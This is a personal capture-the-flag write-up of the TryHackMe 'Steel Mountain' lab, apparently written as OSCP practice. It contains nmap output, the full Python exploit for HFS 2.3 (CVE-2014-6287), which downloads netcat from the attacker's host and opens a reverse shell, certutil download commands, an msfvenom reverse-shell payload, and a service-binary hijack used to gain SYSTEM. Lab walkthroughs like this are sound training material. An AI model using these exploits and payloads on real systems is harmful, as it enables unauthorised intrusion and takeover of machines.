---
title: Steel Mountain
draft: 
tags:
  - thm
  - oscp
---
No need for host discovery, the room gives us the machine's IP address. First question asks who's the employee of the month? Lets pop the machine's IP into a web browser and see if anything comes up.

We get an image of a man with "Employee of the Month" over him. Copying the image url and pasting it shows a name of Bill Harper. We can potentially use this name with some credential brute forcing later.
# Port Scanning
We're told the machine doesn't respond to ICMP requests. This is likely a Windows machines with ping disabled on the firewall. After exporting the IP as a variable, lets do our initial port scan.
## Initial Scan
`nmap -Pn -p- $IP`
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-02 11:29 EDT
Nmap scan report for 10.10.207.64
Host is up (0.18s latency).
Not shown: 65520 closed tcp ports (conn-refused)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
8080/tcp  open  http-proxy
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49162/tcp open  unknown
49169/tcp open  unknown
49170/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 614.69 seconds
```

This seems interesting. I believe 5985 has to do with WinRM, so that may be exploitable. We've already seen a web page, so we'll eventually use gobuster as well. RDP is open.  And something is running on 8080. SMB is also enabled, so enum4linux will come into use here. But first...
## Specific Ports Scan
```
nmap -Pn -p80,135,139,445,3389,5985,8080,47001,49152-49170 -sC -sV $IP 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-02 11:54 EDT
Nmap scan report for 10.10.207.64
Host is up (0.18s latency).

PORT      STATE  SERVICE            VERSION
80/tcp    open   http               Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open   msrpc              Microsoft Windows RPC
139/tcp   open   netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open   microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open   ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2024-07-02T15:56:10+00:00
|_ssl-date: 2024-07-02T15:56:13+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2024-07-01T15:24:25
|_Not valid after:  2024-12-31T15:24:25
5985/tcp  open   http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8080/tcp  open   http               HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
47001/tcp open   http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open   msrpc              Microsoft Windows RPC
49153/tcp open   msrpc              Microsoft Windows RPC
49154/tcp open   msrpc              Microsoft Windows RPC
49155/tcp open   msrpc              Microsoft Windows RPC
49156/tcp closed unknown
49157/tcp closed unknown
49158/tcp closed unknown
49159/tcp closed unknown
49160/tcp closed unknown
49161/tcp closed unknown
49162/tcp open   msrpc              Microsoft Windows RPC
49163/tcp closed unknown
49164/tcp closed unknown
49165/tcp closed unknown
49166/tcp closed unknown
49167/tcp closed unknown
49168/tcp closed unknown
49169/tcp open   msrpc              Microsoft Windows RPC
49170/tcp open   msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-07-02T15:56:07
|_  start_date: 2024-07-02T15:24:14
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:8d:e6:55:fa:3d (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.19 seconds
```

# Thoughts So Far

Okay, we have another web page on port 8080, that when visited in a web browser shows httpfileserver version 2.3, made by rejetto. I recognize this as a very vulnerable service. Lets check searchsploit after submitting our answer to one of the questions.
```
searchsploit HttpFileServer 2.3
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)                                                                | windows/webapps/49125.py
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
Looks like we can get remote command execution on this box.

https://www.exploit-db.com/exploits/39161

We COULD use metasploit for this which can handle everything for us, but that's not very OSCP-prep of us.
### The exploit
```py
#!/usr/bin/python
# Exploit Title: HttpFileServer 2.3.x Remote Command Execution
# Google Dork: intext:"httpfileserver 2.3"
# Date: 04-01-2016
# Remote: Yes
# Exploit Author: Avinash Kumar Thapa aka "-Acid"
# Vendor Homepage: http://rejetto.com/
# Software Link: http://sourceforge.net/projects/hfs/
# Version: 2.3.x
# Tested on: Windows Server 2008 , Windows 8, Windows 7
# CVE : CVE-2014-6287
# Description: You can use HFS (HTTP File Server) to send and receive files.
#	       It's different from classic file sharing because it uses web technology to be more compatible with today's Internet.
#	       It also differs from classic web servers because it's very easy to use and runs "right out-of-the box". Access your remote files, over the network. It has been successfully tested with Wine under Linux. 
 
#Usage : python Exploit.py <Target IP address> <Target Port Number>

#EDB Note: You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe).  
#          You may need to run it multiple times for success!


import urllib2
import sys

try:
	def script_create():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+save+".}")

	def execute_script():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe+".}")

	def nc_run():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe1+".}")

	ip_addr = "192.168.44.128" #local IP address
	local_port = "443" # Local Port number
	vbs = "C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F"+ip_addr+"%2Fnc.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with"
	save= "save|" + vbs
	vbs2 = "cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs"
	exe= "exec|"+vbs2
	vbs3 = "C%3A%5CUsers%5CPublic%5Cnc.exe%20-e%20cmd.exe%20"+ip_addr+"%20"+local_port
	exe1= "exec|"+vbs3
	script_create()
	execute_script()
	nc_run()
except:
	print """[.]Something went wrong..!
	Usage is :[.] python exploit.py <Target IP address>  <Target Port Number>
	Don't forgot to change the Local IP address and Port number on the script"""
	
            
```

Lets copy this into a file, editing the lines that we need to for this to work.
Specifically the `ip_addr` and thr `local_port` variables.

Lets see if this works.

# Gaining a Foothold
First, setup a netcat listener on port 4444.
`nc -lnvp 4444`
Second, setup a python webserver with the nc.exe within the directory the web server was started.
`python3 -m http.server 80`
Third, run the exploit script with python2. (Fails with just python or python3)
`python2 exploit.py 10.10.207.64 8080`
Had to run this twice before I got shell access!

```
C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>whoami
whoami
steelmountain\bill
```
Get the flag from the user profile.

# Privilege Escalation
The room wants us to use a powershell script called [PowerUp](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1)

Lets use Certutil.exe to get this onto the machine, since we are not a meterpreter prompt - though you may use that if you'd like. 

I copied the code from that link into a file called powerup.ps1 and saved it in the working directory of the web server I still have running.

`certutil.exe -urlcache http://<my ip>/powerup.ps1 powerup.ps1`

```
C:\>cd temp
cd temp

C:\temp>certutil.exe -urlcache -f http://10.13.62.120/powerup.ps1 powerup.ps1
certutil.exe -urlcache -f http://10.13.62.120/powerup.ps1 powerup.ps1
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

The powerup.ps1 seems to freeze my box, so I will then instead use winpeas.

Upload it the same way and execute it. We get some neat output. The room tells us to look for services.

![[BlueMountainWinPeas.png]]

With this, we can generate a payload that will give us a reverse shell. We may be able to RDP now, though.
```
Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultUserName               :  bill
    DefaultPassword               :  PMBAf5KhZAxVhvqb
```

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.13.62.120 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of exe-service file: 15872 bytes
Saved as: ASCService.exe
```

Then start our netcat listener
`nc -lvnp 4443`

We upload that exe with the same cert util, then we copy it into the program files location.

`net stop AdvancedSystemCareService9`

```
copy ASCService.exe "C:\Program Files (x86)\IObit\Advanced Systemcare"
copy ASCService.exe "C:\Program Files (x86)\IObit\Advanced Systemcare"
Overwrite C:\Program Files (x86)\IObit\Advanced Systemcare\ASCService.exe? (Yes/No/All): yes
yes
        1 file(s) copied.
```

`net start AdvancedSystemCareService9`

Now back on our new netcat listener...

```
nc -lvnp 4443                
listening on [any] 4443 ...
connect to [10.13.62.120] from (UNKNOWN) [10.10.207.64] 49383
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

# Post Exploitation 
Then we just navigate to the Administrator's Desktop folder and find the root flag!

And it turns out there's a section at the bottom of the room about performing this exploit without metasploit. Hah! 

![[BlueSteelComplete.png]]


